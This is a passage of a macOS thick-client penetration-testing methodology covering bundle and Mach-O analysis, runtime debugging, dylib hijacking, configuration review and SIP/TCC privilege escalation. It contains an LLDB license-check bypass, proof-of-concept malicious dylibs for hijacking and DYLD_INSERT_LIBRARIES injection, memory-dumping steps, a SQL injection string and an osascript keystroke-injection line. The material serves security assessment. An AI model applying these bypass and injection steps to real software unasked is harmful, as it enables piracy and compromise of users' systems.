# macOS Thick Client Application Security Testing Methodology

**Version:** 1.0
**Date:** 2026-01-28
**Classification:** Security Testing Methodology
**Platform:** macOS Desktop Applications

---

## Overview

This methodology provides a comprehensive framework for security testing of macOS thick client applications, including native Mach-O binaries, application bundles (.app), frameworks, and hybrid architectures (Electron, Flutter, SwiftUI).

**Scope:** Desktop applications installed on macOS systems (macOS 12 Monterey, macOS 13 Ventura, macOS 14 Sonoma, macOS 15 Sequoia)

**Authoritative Sources:**
- [PTES (Penetration Testing Execution Standard)](https://www.pentest-standard.org/)
- [NIST SP 800-115: Technical Guide to Information Security Testing and Assessment](https://csrc.nist.gov/pubs/sp/800/115/final)
- [NIST SP 800-219: macOS Security Compliance Project (mSCP)](https://pages.nist.gov/macos_security/)
- [OSSTMM (Open Source Security Testing Methodology Manual)](https://www.isecom.org/OSSTMM.3.pdf)
- [MITRE ATT&CK for Enterprise (macOS)](https://attack.mitre.org/matrices/enterprise/macos/)
- [CIS Apple macOS Benchmarks](https://www.cisecurity.org/benchmark/apple_os) (2024 Updates)
- [Apple Platform Security Guide](https://support.apple.com/guide/security/)
- [SEI CERT C/C++ Coding Standard](https://wiki.sei.cmu.edu/confluence/pages/viewpage.action?pageId=88046682)
- [OWASP Application Security Verification Standard (ASVS)](https://owasp.org/www-project-application-security-verification-standard/)

---

## Methodology Structure

This methodology follows an 8-phase approach aligned with PTES and NIST SP 800-115:

1. **Application Fingerprinting** - Identify bundle structure, frameworks, and dependencies
2. **Mach-O Binary Analysis** - Analyze Mach-O format and security features
3. **Runtime Analysis** - Monitor behavior with fs_usage, dtrace, Instruments
4. **Dylib Hijacking & Code Injection** - Test for dynamic library vulnerabilities
5. **Configuration Security** - Analyze plist files, keychain, and permissions
6. **Privilege Escalation** - Test SIP bypass, TCC abuse, and entitlement exploitation
7. **Memory Corruption** - Test for buffer overflows and heap vulnerabilities
8. **Network Security** - Analyze client-side network communications

---

## Phase 1: Application Fingerprinting

**Objective:** Identify application architecture, frameworks, code signing, and dependencies.

### 1.1 Application Bundle Analysis

**macOS applications are packaged as bundles (.app):**

```bash
# Inspect bundle structure
ls -la "/Applications/TargetApp.app/Contents/"

# Key directories:
# - MacOS/         - Main executable
# - Resources/     - Assets, images, configs
# - Frameworks/    - Embedded frameworks
# - PlugIns/       - Plugins and extensions
# - Info.plist     - Application metadata

# Read Info.plist
plutil -p "/Applications/TargetApp.app/Contents/Info.plist"
```

**Key Info.plist fields:**
- `CFBundleIdentifier` - Unique app identifier (e.g., com.company.app)
- `CFBundleExecutable` - Name of main executable
- `CFBundleVersion` - Build version
- `LSMinimumSystemVersion` - Minimum macOS version required
- `NSHighResolutionCapable` - Retina display support
- `NSSupportsAutomaticGraphicsSwitching` - GPU switching

**MITRE ATT&CK:** [T1083 - File and Directory Discovery](https://attack.mitre.org/techniques/T1083/)

**Reference:** [Apple - Bundle Programming Guide](https://developer.apple.com/library/archive/documentation/CoreFoundation/Conceptual/CFBundles/)

### 1.2 Framework Detection

**Identify development framework:**

**Native Swift/Objective-C:**
```bash
# Check for Swift runtime
otool -L "/Applications/TargetApp.app/Contents/MacOS/TargetApp" | grep -i swift

# Check for Objective-C classes
nm -arch x86_64 "/Applications/TargetApp.app/Contents/MacOS/TargetApp" | grep -i "OBJC_CLASS"

# Dump Objective-C class names
class-dump "/Applications/TargetApp.app/Contents/MacOS/TargetApp" > classes.txt
```

**Electron (JavaScript/Chromium):**
```bash
# Electron apps contain these files
ls "/Applications/TargetApp.app/Contents/Frameworks/" | grep -i "Electron Framework"
ls "/Applications/TargetApp.app/Contents/Resources/" | grep -E "app.asar|electron"
```

**Flutter:**
```bash
# Flutter apps embed flutter engine
ls "/Applications/TargetApp.app/Contents/Frameworks/" | grep -i "FlutterMacOS"
ls "/Applications/TargetApp.app/Contents/Resources/" | grep "flutter_assets"
```

**Java:**
```bash
# Java apps contain JRE
ls "/Applications/TargetApp.app/Contents/PlugIns/" | grep -i "jre"
file "/Applications/TargetApp.app/Contents/MacOS/JavaAppLauncher"
```

**Reference:** [NIST mSCP - Application Verification](https://pages.nist.gov/macos_security/)

### 1.3 Code Signing Analysis

**macOS enforces code signing for notarization and Gatekeeper:**

```bash
# Verify code signature
codesign -dvvv "/Applications/TargetApp.app"

# Check for hardened runtime
codesign -d --entitlements - "/Applications/TargetApp.app"

# Validate signature
spctl --assess --verbose "/Applications/TargetApp.app"

# Check notarization status
spctl -a -vvv -t install "/Applications/TargetApp.app"
```

**Key output fields:**
- **Identifier:** Bundle identifier
- **Authority:** Certificate chain (Developer ID Application, Apple Root CA)
- **TeamIdentifier:** Apple Developer Team ID
- **Sealed Resources:** Checks if Resources/ folder is signed
- **Entitlements:** Special capabilities granted to app
- **Runtime Version:** Hardened Runtime version

**Vulnerabilities to identify:**
1. **Ad-hoc signature:** `Authority=(adhoc)` - Not from Apple Developer Program
2. **Missing hardened runtime:** More vulnerable to injection attacks
3. **Invalid signature:** Modified after signing (malware indicator)
4. **Self-signed:** Not trusted by default (requires user override)

**MITRE ATT&CK:** [T1553.002 - Subvert Trust Controls: Code Signing](https://attack.mitre.org/techniques/T1553/002/)

**Reference:** [Apple Platform Security - Code Signing](https://support.apple.com/guide/security/code-signing-sec7c917bf14/web)

### 1.4 Dependency Mapping

**Tools:** `otool`, `dyldinfo`

**Map dynamic library dependencies:**
```bash
# List all linked dylibs
otool -L "/Applications/TargetApp.app/Contents/MacOS/TargetApp"

# Example output:
# /usr/lib/libSystem.B.dylib
# /System/Library/Frameworks/Foundation.framework/Versions/C/Foundation
# @rpath/CustomFramework.framework/Versions/A/CustomFramework  ⚠️ RPATH

# Analyze load commands
otool -l "/Applications/TargetApp.app/Contents/MacOS/TargetApp" | grep -A 3 "LC_LOAD"

# Check for weak linking
otool -l "/Applications/TargetApp.app/Contents/MacOS/TargetApp" | grep "LC_LOAD_WEAK_DYLIB"

# Examine RPATH
otool -l "/Applications/TargetApp.app/Contents/MacOS/TargetApp" | grep -A 2 "LC_RPATH"
```

**Analyze for security-relevant frameworks:**
- **Security.framework** - Keychain, certificates, encryption
- **Network.framework** - Modern networking API
- **SystemConfiguration.framework** - Network configuration
- **CFNetwork.framework** - Legacy networking (HTTP/S, FTP)
- **libcurl.dylib** - HTTP client library

**Dylib load order (potential hijacking):**
1. `@executable_path` - Relative to executable
2. `@loader_path` - Relative to library loading the dylib
3. `@rpath` - Runtime search paths (defined by `LC_RPATH`)
4. `/usr/lib`, `/System/Library` - System libraries

**Reference:** [Apple - Dynamic Library Programming Topics](https://developer.apple.com/library/archive/documentation/DeveloperTools/Conceptual/DynamicLibraries/)

---

## Phase 2: Mach-O Binary Analysis

**Objective:** Analyze Mach-O binary structure, security mitigations, and identify hardcoded secrets.

### 2.1 Security Mitigation Analysis

**Tools:** `checksec.sh`, `pagestuff`, `otool`

**Check security features:**
```bash
# Using checksec script
./checksec.sh --file="/Applications/TargetApp.app/Contents/MacOS/TargetApp"

# Manual checks with otool
otool -hv "/Applications/TargetApp.app/Contents/MacOS/TargetApp"

# Check for PIE (Position Independent Executable)
otool -hv "/Applications/TargetApp.app/Contents/MacOS/TargetApp" | grep -i "PIE"

# Check for stack canaries (__stack_chk_guard)
nm "/Applications/TargetApp.app/Contents/MacOS/TargetApp" | grep "__stack_chk"

# Check for ARC (Automatic Reference Counting)
otool -IV "/Applications/TargetApp.app/Contents/MacOS/TargetApp" | grep -i "objc_retain\|objc_release"
```

**Security features to verify:**

| Feature | Check Method | Description | CWE |
|---------|--------------|-------------|-----|
| PIE (ASLR) | `otool -hv \| grep PIE` | Position Independent Executable | CWE-120 |
| Stack Canaries | `nm \| grep __stack_chk` | Buffer overflow protection | CWE-121 |
| ARC | `otool -IV \| grep objc_retain` | Automatic memory management | CWE-416 |
| Hardened Runtime | `codesign -d --entitlements` | Runtime protection features | CWE-693 |
| Library Validation | Entitlements check | Only load Apple-signed dylibs | CWE-427 |
| ASLR | PIE + shared cache | Address Space Layout Randomization | CWE-120 |

**Vulnerability:** Missing security mitigations indicate vulnerable compilation, potentially exploitable via memory corruption attacks.

**Reference:** [CIS macOS Benchmark 2024 - Application Security](https://www.cisecurity.org/benchmark/apple_os)

### 2.2 Static Reverse Engineering

**Tools:** [Hopper Disassembler](https://www.hopperapp.com/), [Ghidra](https://ghidra-sre.org/), [IDA Pro](https://hex-rays.com/ida-pro/), [Binary Ninja](https://binary.ninja/)

**Hopper Disassembler workflow:**
```bash
# Open binary in Hopper
open -a Hopper "/Applications/TargetApp.app/Contents/MacOS/TargetApp"

# Hopper will:
# 1. Disassemble Mach-O binary
# 2. Identify Objective-C/Swift methods
# 3. Generate pseudo-code
# 4. Identify strings and symbols
```

**Key analysis tasks:**
1. **Objective-C class inspection:**
```bash
# Dump Objective-C runtime information
class-dump "/Applications/TargetApp.app/Contents/MacOS/TargetApp" > classes.txt

# Look for interesting classes
grep -i "auth\|login\|password\|crypto\|api" classes.txt
```

2. **String analysis:**
```bash
# Extract strings
strings -a "/Applications/TargetApp.app/Contents/MacOS/TargetApp" > strings.txt

# Search for sensitive data
grep -iE "password|apikey|token|secret|aws_|sk_|pk_" strings.txt
grep -E "https?://[a-zA-Z0-9./?=_-]+" strings.txt  # URLs
grep -E "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}" strings.txt  # IP addresses
```

3. **Swift demangle:**
```bash
# Swift symbols are mangled - demangle for readability
nm "/Applications/TargetApp.app/Contents/MacOS/TargetApp" | swift demangle > symbols.txt
```

**MITRE ATT&CK:** [T1552.001 - Credentials in Files](https://attack.mitre.org/techniques/T1552/001/)

**Example finding: Hardcoded API key in strings:**
```
Found in binary strings:
API_KEY=sk_live_51HqT2KLmN8pQ9rS
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
```

**Reference:** [Tutorial: iOS Reverse Engineering with class-dump & Hopper](http://www.enharmonichq.com/tutorial-ios-reverse-engineering-class-dump-hopper-dissasembler/)

### 2.3 Resource Analysis

**Extract resources for sensitive data:**

```bash
# Navigate to Resources directory
cd "/Applications/TargetApp.app/Contents/Resources"

# List all resources
find . -type f

# Common resources to inspect:
# - *.plist - Configuration files
# - *.json - API configurations, settings
# - *.db, *.sqlite - Embedded databases
# - *.p12, *.pem, *.key - Certificates and keys
# - *.strings - Localization files (may contain debug info)
```

**Check for embedded credentials:**
```bash
# Search config files for secrets
find /Applications/TargetApp.app/Contents/Resources -type f \( -name "*.plist" -o -name "*.json" -o -name "*.xml" \) -exec grep -iH "password\|key\|secret\|token" {} \;

# Extract and decode binary plists
plutil -convert xml1 config.plist -o config.xml
cat config.xml | grep -iE "password|apikey|token"
```

**Example vulnerable config:**
```xml
<!-- config.plist -->
<plist version="1.0">
<dict>
    <key>APIEndpoint</key>
    <string>https://api.example.com</string>
    <key>APIKey</key>
    <string>sk_live_51HqT2KLmN8pQ9rS</string>  ⚠️ HARDCODED
</dict>
</plist>
```

**Reference:** [NIST SP 800-115 Section 5.3.4 - Source Code Review](https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-115.pdf)

### 2.4 Entitlements Analysis

**Entitlements grant special capabilities to applications:**

```bash
# Extract entitlements
codesign -d --entitlements :- "/Applications/TargetApp.app" --xml

# Or directly from binary
ldid -e "/Applications/TargetApp.app/Contents/MacOS/TargetApp"
```

**Common entitlements:**

**Dangerous Private Entitlements (requires special Apple approval):**
- `com.apple.rootless.install.heritable` - Bypass SIP ⚠️ HIGH RISK
- `com.apple.private.security.disable-library-validation` - Load unsigned dylibs ⚠️
- `com.apple.private.tcc.allow` - Bypass TCC prompts ⚠️
- `com.apple.security.cs.debugger` - Debug other processes ⚠️

**Public Entitlements:**
- `com.apple.security.app-sandbox` - Application sandboxing (good)
- `com.apple.security.network.client` - Network access allowed
- `com.apple.security.files.user-selected.read-write` - File access via Open dialog
- `com.apple.security.cs.allow-dyld-environment-variables` - Allow DYLD_ vars ⚠️
- `com.apple.security.cs.disable-library-validation` - Allow 3rd party dylibs ⚠️

**Security analysis:**
```xml
<!-- VULNERABLE entitlements -->
<key>com.apple.security.cs.allow-dyld-environment-variables</key>
<true/>  ⚠️ Allows DYLD_INSERT_LIBRARIES injection

<key>com.apple.security.cs.disable-library-validation</key>
<true/>  ⚠️ Can load unsigned dylibs → code injection

<key>com.apple.security.app-sandbox</key>
<false/>  ⚠️ NOT sandboxed → full system access
```

**Reference:** [Microsoft Security Blog - CVE-2024-44243: SIP Bypass](https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/)

---

## Phase 3: Runtime Analysis

**Objective:** Monitor application behavior during execution to identify runtime vulnerabilities.

### 3.1 File System Monitoring

**Tools:** `fs_usage`, `opensnoop`, `filebyproc.d`

**Monitor file system access:**
```bash
# Monitor all file operations by application
sudo fs_usage -w -f filesystem | grep "TargetApp"

# Monitor only file opens
sudo opensnoop -n TargetApp

# Using DTrace script
sudo dtrace -n 'syscall::open*:entry /execname == "TargetApp"/ { printf("%s", copyinstr(arg0)); }'
```

**Look for:**
1. **Config files in insecure locations:**
```bash
# Writes to world-readable locations
~/Library/Application Support/TargetApp/config.plist  # Check permissions
/tmp/app_config.tmp  ⚠️ INSECURE
```

2. **Plaintext credential storage:**
```bash
# Application writes password to file
open    ~/Library/Application Support/TargetApp/credentials.txt
# Contains: username=admin&password=P@ssw0rd123  ⚠️
```

3. **Temporary file insecurity:**
```bash
# Predictable temp file names
open    /tmp/app_temp_12345.dat  ⚠️ PREDICTABLE → symlink attack
```

**MITRE ATT&CK:** [T1083 - File and Directory Discovery](https://attack.mitre.org/techniques/T1083/)

**Reference:** [OSSTMM Section 4.6 - Process Monitoring](https://www.isecom.org/OSSTMM.3.pdf)

### 3.2 System Call Tracing

**Tools:** `dtruss`, `dtrace`, `Instruments`

**Trace system calls:**
```bash
# Trace all system calls
sudo dtruss -n TargetApp 2>&1 | tee syscalls.log

# Trace specific syscalls
sudo dtruss -t open -t read -t write -n TargetApp

# Monitor network syscalls
sudo dtruss -t connect -t sendto -t recvfrom -n TargetApp
```

**Analyze for security issues:**
1. **Crypto operations:**
```bash
# Look for weak crypto APIs
grep -i "CCCrypt\|SecKeyEncrypt\|CommonCrypto" syscalls.log

# Check algorithm parameters
# DES (56-bit) → WEAK
# 3DES (112-bit) → WEAK
# AES-128+ → OK
```

2. **Command execution:**
```bash
# Check for shell command execution
sudo dtruss -t execve -n TargetApp

# If app calls system(userInput) or popen(userInput) → COMMAND INJECTION
```

**Reference:** [NIST mSCP - Audit and Accountability](https://pages.nist.gov/macos_security/)

### 3.3 Dynamic Debugging

**Tools:** [LLDB](https://lldb.llvm.org/), Xcode Debugger

**Attach debugger to running process:**
```bash
# Launch app and get PID
pgrep -f TargetApp

# Attach LLDB
lldb -p <PID>

# Or launch under debugger
lldb "/Applications/TargetApp.app/Contents/MacOS/TargetApp"
(lldb) run
```

**Common debugging tasks:**

**1. Set breakpoint on authentication function:**
```lldb
# Find auth-related symbols
(lldb) image lookup -r -n ".*auth.*" TargetApp

# Set breakpoint
(lldb) breakpoint set --name "-[LoginManager authenticateUser:withPassword:]"
(lldb) continue

# When hit, inspect arguments
(lldb) po $arg1  # self
(lldb) po $arg2  # _cmd (selector)
(lldb) po $arg3  # first argument (username)
(lldb) po $arg4  # second argument (password)
```

**2. Bypass license check:**
```lldb
# Find license validation function
(lldb) image lookup -r -n ".*license.*"

# Set breakpoint
(lldb) breakpoint set --name "-[LicenseManager validateLicense]"

# Modify return value to always return YES
(lldb) finish
(lldb) expr $rax = 1  # Set return register to true
(lldb) continue
```

**3. Inspect encryption keys in memory:**
```lldb
# Search memory for key patterns (AES-256 = 32 bytes)
(lldb) memory find -s "0x00" -c 32 0x0000000100000000 0x00000001FFFFFFFF

# Dump key
(lldb) memory read --size 1 --format x --count 32 <address>
```

**MITRE ATT&CK:** [T1622 - Debugger Evasion](https://attack.mitre.org/techniques/T1622/) (Check if app detects debugging)

**Reference:** [Apriorit - Using LLDB for Reversing macOS Functions](https://www.apriorit.com/dev-blog/lldb-for-reversing-macos-functions)

### 3.4 Memory Inspection

**Tools:** `vmmap`, `heap`, `leaks`

**Analyze process memory:**
```bash
# Get PID
pgrep -f TargetApp

# View memory map
vmmap <PID> | less

# Search for writable + executable regions (dangerous)
vmmap <PID> | grep "rwx"

# Dump heap
heap <PID> > heap_dump.txt

# Search heap for secrets
strings heap_dump.txt | grep -iE "password|token|key|secret"
```

**Memory analysis with LLDB:**
```lldb
# Attach to process
lldb -p <PID>

# Dump entire memory regions
(lldb) memory read --outfile memory.bin --binary 0x0000000100000000 0x00000001FFFFFFFF

# Search dumped memory for patterns
strings memory.bin | grep -iE "password|api.*key|secret|token"
```

**Vulnerability: Sensitive data in memory:**
- Passwords remain in memory after authentication
- Encryption keys not zeroed after use
- API tokens readable in process memory

**Reference:** [NIST SP 800-115 Section 7 - Supplemental Testing](https://csrc.nist.gov/pubs/sp/800/115/final)

---

## Phase 4: Dylib Hijacking & Code Injection

**Objective:** Test for dynamic library hijacking and code injection vulnerabilities.

### 4.1 Dylib Hijacking (MITRE ATT&CK T1574.004)

**MITRE ATT&CK:** [T1574.004 - Hijack Execution Flow: Dylib Hijacking](https://attack.mitre.org/techniques/T1574/004/)

**macOS dylib search order:**
1. `@executable_path` - Directory containing the main executable
2. `@loader_path` - Directory containing the library making the call
3. `@rpath` - Runtime search paths defined by `LC_RPATH` load commands
4. `/usr/lib`, `/System/Library/Frameworks` - System locations

**Reference:** [MITRE ATT&CK - Dylib Hijacking](https://attack.mitre.org/techniques/T1574/004/)

**Identify vulnerable dylib paths:**
```bash
# Check for @rpath references
otool -L "/Applications/TargetApp.app/Contents/MacOS/TargetApp" | grep @rpath

# Example vulnerable output:
@rpath/CustomFramework.framework/Versions/A/CustomFramework

# Check where @rpath resolves to
otool -l "/Applications/TargetApp.app/Contents/MacOS/TargetApp" | grep -A 2 "LC_RPATH"

# Example output:
# cmd LC_RPATH
# path @loader_path/../Frameworks  ⚠️ If writable → vulnerable
```

**Test for hijackability:**
```bash
# Check if @rpath directory is writable
ls -la "/Applications/TargetApp.app/Contents/Frameworks/"

# If current user can write here → VULNERABLE
# Attacker can place malicious CustomFramework.framework
```

**Create malicious dylib (proof of concept):**
```c
// malicious.c
#include <syslog.h>
#include <stdio.h>

__attribute__((constructor))
void hijacked() {
    syslog(LOG_ALERT, "[*] Dylib hijacked! PID: %d", getpid());
    printf("[*] Dylib hijacked!\n");
    // Real attack: spawn reverse shell, steal data, etc.
}
```

**Compile and test:**
```bash
# Compile as dylib
clang -dynamiclib malicious.c -o CustomFramework.framework/Versions/A/CustomFramework

# Place in @rpath location
cp -r CustomFramework.framework "/Applications/TargetApp.app/Contents/Frameworks/"

# Run application
open -a TargetApp

# Check system log
log show --predicate 'eventMessage contains "Dylib hijacked"' --last 1m
```

**Defense detection:**
- Library Validation entitlement (`com.apple.security.cs.library-validation`)
- Hardened Runtime enabled
- Application properly signs all embedded frameworks

**Reference:** [HackTricks - macOS Library Injection](https://book.hacktricks.wiki/en/macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-library-injection/)

### 4.2 Weak Linking Exploitation

**Weak linking allows optional dylibs (app runs even if dylib missing):**

```bash
# Find weak linked dylibs
otool -l "/Applications/TargetApp.app/Contents/MacOS/TargetApp" | grep -A 2 "LC_LOAD_WEAK_DYLIB"

# Example:
# cmd LC_LOAD_WEAK_DYLIB
# name /usr/lib/optional_lib.dylib  ⚠️ If missing, can hijack
```

**Exploitation:**
If weak-linked dylib is missing, attacker can provide malicious version.

**Test:**
```bash
# Check if dylib exists
ls /usr/lib/optional_lib.dylib

# If doesn't exist → Create malicious one
# (Requires disabling SIP for /usr/lib write, or target other paths)
```

**Reference:** [Apple - Dynamic Library Programming Topics](https://developer.apple.com/library/archive/documentation/DeveloperTools/Conceptual/DynamicLibraries/)

### 4.3 DYLD_INSERT_LIBRARIES Injection

**If app has `com.apple.security.cs.allow-dyld-environment-variables` entitlement:**

```bash
# Check for entitlement
codesign -d --entitlements :- "/Applications/TargetApp.app" | grep "allow-dyld-environment-variables"

# If present, inject custom dylib
DYLD_INSERT_LIBRARIES=/path/to/malicious.dylib /Applications/TargetApp.app/Contents/MacOS/TargetApp
```

**Malicious dylib example:**
```c
// inject.c
#include <stdio.h>

__attribute__((constructor))
void load() {
    printf("[*] Injected dylib loaded!\n");
    // Real attack: hook functions, steal credentials, etc.
}
```

**Compile and test:**
```bash
# Compile
clang -dynamiclib inject.c -o inject.dylib

# Inject
DYLD_INSERT_LIBRARIES=./inject.dylib /Applications/TargetApp.app/Contents/MacOS/TargetApp
```

**Defense:** Modern apps should NOT have `allow-dyld-environment-variables` entitlement.

**MITRE ATT&CK:** [T1574.006 - Dynamic Linker Hijacking](https://attack.mitre.org/techniques/T1574/006/)

**Reference:** [HackTricks - DYLD_INSERT_LIBRARIES](https://book.hacktricks.wiki/en/macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.html)

### 4.4 Framework Hijacking

**Applications may search for frameworks in multiple locations:**

```bash
# Check framework search paths
otool -l "/Applications/TargetApp.app/Contents/MacOS/TargetApp" | grep -A 2 "LC_LOAD_DYLIB\|LC_RPATH"

# If framework path is relative or uses @rpath:
@rpath/MyFramework.framework/Versions/A/MyFramework

# Attacker places malicious framework earlier in search order
```

**Exploitation steps:**
1. Identify framework loaded by application
2. Create malicious framework with same name and structure
3. Place in directory searched before legitimate framework
4. Application loads malicious version

**Reference:** [CIS macOS Benchmark - Application Whitelisting](https://www.cisecurity.org/benchmark/apple_os)

---

## Phase 5: Configuration Security

**Objective:** Analyze configuration files, Keychain storage, and file permissions.

### 5.1 Property List (plist) Analysis

**Common plist locations:**
```bash
# Application preferences
~/Library/Preferences/com.company.appname.plist

# Application Support
~/Library/Application Support/AppName/config.plist

# Global preferences
/Library/Preferences/com.company.appname.plist

# Application bundle
/Applications/AppName.app/Contents/Resources/*.plist
```

**Analyze plists for sensitive data:**
```bash
# Convert binary plist to XML
plutil -convert xml1 ~/Library/Preferences/com.company.appname.plist -o config.xml

# Search for secrets
grep -iE "password|key|token|secret|api" config.xml

# Check file permissions
ls -l ~/Library/Preferences/com.company.appname.plist
# If world-readable (644) → ⚠️ INFORMATION DISCLOSURE
```

**Example vulnerable plist:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<plist version="1.0">
<dict>
    <key>ServerURL</key>
    <string>https://api.example.com</string>
    <key>Username</key>
    <string>admin</string>
    <key>Password</key>
    <string>P@ssw0rd123</string>  ⚠️ PLAINTEXT
    <key>APIKey</key>
    <string>sk_live_51HqT2KLmN8pQ9rS</string>  ⚠️ HARDCODED
</dict>
</plist>
```

**MITRE ATT&CK:** [T1552.001 - Credentials in Files](https://attack.mitre.org/techniques/T1552/001/)

**Reference:** [Apple - Preferences and Settings Programming Guide](https://developer.apple.com/library/archive/documentation/Cocoa/Conceptual/UserDefaults/)

### 5.2 Keychain Security Testing

**macOS Keychain stores credentials securely (when used correctly):**

```bash
# Check if app stores credentials in Keychain
security dump-keychain -d ~/Library/Keychains/login.keychain-db | grep -i "appname"

# Find specific keychain items
security find-generic-password -s "AppName" -g

# Find internet passwords
security find-internet-password -s "api.example.com" -g
```

**Common misuses:**
1. **No Keychain usage** - Credentials in plist instead ⚠️
2. **Weak access control** - Keychain items readable by any process
3. **No Secure Enclave** - Not using hardware-backed security

**Test Keychain access control:**
```bash
# Check Access Control List (ACL)
security dump-keychain ~/Library/Keychains/login.keychain-db | grep -A 10 "AppName"

# Vulnerable if: "partitionID" = "apple" → Any Apple-signed app can access
# Secure: "partitionID" = "com.company.appname" → Only this app can access
```

**Proper Keychain usage (Swift example):**
```swift
// SECURE: Store password in Keychain with proper ACL
let query: [String: Any] = [
    kSecClass as String: kSecClassGenericPassword,
    kSecAttrAccount as String: username,
    kSecAttrService as String: "com.company.appname",
    kSecValueData as String: password.data(using: .utf8)!,
    kSecAttrAccessible as String: kSecAttrAccessibleWhenUnlockedThisDeviceOnly
]
SecItemAdd(query as CFDictionary, nil)
```

**Reference:** [Apple Platform Security - Keychain](https://support.apple.com/guide/security/keychain-data-protection-secb0694df1a/web)

### 5.3 File Permission Analysis

**Check permissions on application-created files:**
```bash
# Find all files created by application
sudo fs_usage -w -f filesystem | grep TargetApp | grep "open"

# For each file, check permissions
ls -l /path/to/app/file

# Vulnerable permissions:
# -rw-r--r--  (644) - World-readable  ⚠️ If contains sensitive data
# -rwxrwxrwx  (777) - World-writable  ⚠️ CRITICAL
# drwxrwxrwx  (777) - Directory writable by all  ⚠️ CRITICAL
```

**Test for world-writable locations:**
```bash
# Check if app writes to /tmp
sudo fs_usage -w -f filesystem | grep TargetApp | grep "/tmp"

# /tmp is world-readable → INFORMATION DISCLOSURE
# Race conditions possible if temp files predictable
```

**POSIX permissions should be:**
```bash
# User-only readable config: 600 (-rw-------)
chmod 600 ~/Library/Application Support/AppName/config.plist

# User-only readable/writable directory: 700 (drwx------)
chmod 700 ~/Library/Application Support/AppName/
```

**Reference:** [CIS macOS Benchmark 6.1 - File Permissions](https://www.cisecurity.org/cis-benchmarks)

### 5.4 Database Security

**If application uses local database (SQLite, Core Data):**

```bash
# Find database files
find ~/Library/Application Support/AppName -name "*.db" -o -name "*.sqlite"

# Check permissions
ls -l ~/Library/Application Support/AppName/app.db

# Inspect contents
sqlite3 ~/Library/Application Support/AppName/app.db

# Check for plaintext credentials
sqlite> .tables
sqlite> SELECT * FROM users;
sqlite> SELECT * FROM credentials;
```

**Common vulnerabilities:**
1. **Plaintext passwords in database:**
```sql
SELECT username, password FROM users;
-- Output: admin | P@ssw0rd123  ⚠️ NOT HASHED
```

2. **Weak encryption:**
```sql
-- SQLCipher with weak key
-- Key stored in source code or plist → VULNERABLE
```

3. **SQL injection (client-side):**
```swift
// VULNERABLE CODE
let query = "SELECT * FROM users WHERE username = '\(userInput)'"
// userInput = "admin' OR '1'='1" → Bypasses authentication
```

**Reference:** [OWASP - Insecure Data Storage](https://owasp.org/www-project-mobile-top-10/)

---

## Phase 6: Privilege Escalation

**Objective:** Test for vulnerabilities allowing unprivileged user to gain elevated privileges.

### 6.1 System Integrity Protection (SIP) Bypass

**MITRE ATT&CK:** [T1548.001 - Abuse Elevation Control Mechanism: Setuid and Setgid](https://attack.mitre.org/techniques/T1548/001/)

**CVE-2024-44243: Recent SIP Bypass (January 2025)**

**Background:**
System Integrity Protection (SIP) prevents modification of system files and restricts privileged operations. CVE-2024-44243 exploited `storagekitd` daemon with `com.apple.rootless.install.heritable` entitlement.

**Reference:** [Microsoft Security Blog - CVE-2024-44243 Analysis](https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/)

**Check SIP status:**
```bash
# Check if SIP is enabled
csrutil status

# Output: "System Integrity Protection status: enabled." → Good
# Output: "System Integrity Protection status: disabled." → VULNERABLE
```

**Identify processes with SIP-bypassing entitlements:**
```bash
# Find processes with rootless.install entitlements
ps aux | awk '{print $2}' | while read pid; do
    codesign -d --entitlements - /proc/$pid/file 2>/dev/null | grep -q "rootless.install" && echo "PID $pid has rootless.install entitlement"
done
```

**Exploitation technique (CVE-2024-44243):**
1. Attacker with root access creates malicious filesystem bundle
2. Places bundle in `/Library/Filesystems/`
3. Triggers `storagekitd` to load and mount the malicious filesystem
4. Malicious filesystem executes code with SIP bypass

**Test for vulnerable installers:**
```bash
# Find .pkg installers with strong entitlements
find /Applications -name "*.pkg" -o -name "*.app" | while read app; do
    codesign -d --entitlements - "$app" 2>/dev/null | grep -i "rootless\|install\|private" && echo "Potential SIP bypass: $app"
done
```

**Mitigation verification:**
- Update to macOS 15.2+ (Sequoia), 14.7.2+ (Sonoma), 13.7.2+ (Ventura)
- Limit applications with `com.apple.rootless.install` entitlement
- Monitor `/Library/Filesystems` for unauthorized bundles

**Reference:** [CVE-2024-44243 - macOS SIP Bypass](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-44243)

### 6.2 Transparency, Consent, and Control (TCC) Bypass

**TCC enforces privacy protections (Camera, Microphone, Files, Location):**

**Check TCC database:**
```bash
# System TCC database
sudo sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db "SELECT * FROM access"

# User TCC database
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db "SELECT service, client, auth_value FROM access WHERE client LIKE '%AppName%'"
```

**Common TCC bypass techniques:**

**1. Synthetic Events (accessibility abuse):**
```bash
# Check if app has accessibility permissions
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
  "SELECT * FROM access WHERE service='kTCCServiceAccessibility' AND client LIKE '%AppName%'"

# If granted → App can control other apps (simulate clicks, keystrokes)
# Risk: Can click "Allow" on TCC prompts for other permissions
```

**2. Entitlement abuse:**
```bash
# Check for TCC-bypassing entitlements
codesign -d --entitlements :- "/Applications/AppName.app" | grep "com.apple.private.tcc.allow"

# This private entitlement bypasses TCC prompts (only Apple-signed apps should have it)
```

**3. AppleScript/Automator abuse:**
```bash
# If app has automation permission, it can control other apps
osascript -e 'tell application "System Events" to keystroke "sudo password" & return'
# Can automate privileged operations through authorized apps
```

**MITRE ATT&CK:** [T1548.002 - Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002/) (equivalent on macOS)

**Reference:** [CIS macOS Benchmark 2.5 - Privacy Controls](https://www.cisecurity.org/cis-benchmarks)

### 6.3 Setuid/Setgid Binary Exploitation

**Find setuid binaries:**
```bash
# System-wide search
